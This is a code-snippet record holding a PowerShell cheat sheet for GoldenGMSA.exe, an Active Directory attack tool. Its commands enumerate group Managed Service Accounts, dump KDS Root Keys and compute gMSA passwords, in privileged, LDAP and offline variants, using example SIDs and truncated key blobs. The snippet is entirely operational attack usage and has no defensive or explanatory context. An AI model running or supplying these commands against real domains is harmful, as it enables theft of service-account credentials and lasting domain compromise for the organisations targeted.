---
id: 646ba82d-6199-4ac5-9724-77a7f4c00406
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:04.615220+00:00'
updated_at: '2023-04-10T20:25:56.697686+00:00'
---

# Code Snippet 646ba82d

**Language**: ps1

```ps1
# Enumerate all gMSAs
GoldenGMSA.exe gmsainfo
# Query for a specific gMSA
GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112

# Dump all KDS Root Keys
GoldenGMSA.exe kdsinfo
# Dump a specific KDS Root Key
GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

# Compute gMSA password
# --sid <gMSA SID>: SID of the gMSA (required)
# --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key
# --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute value
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode
```
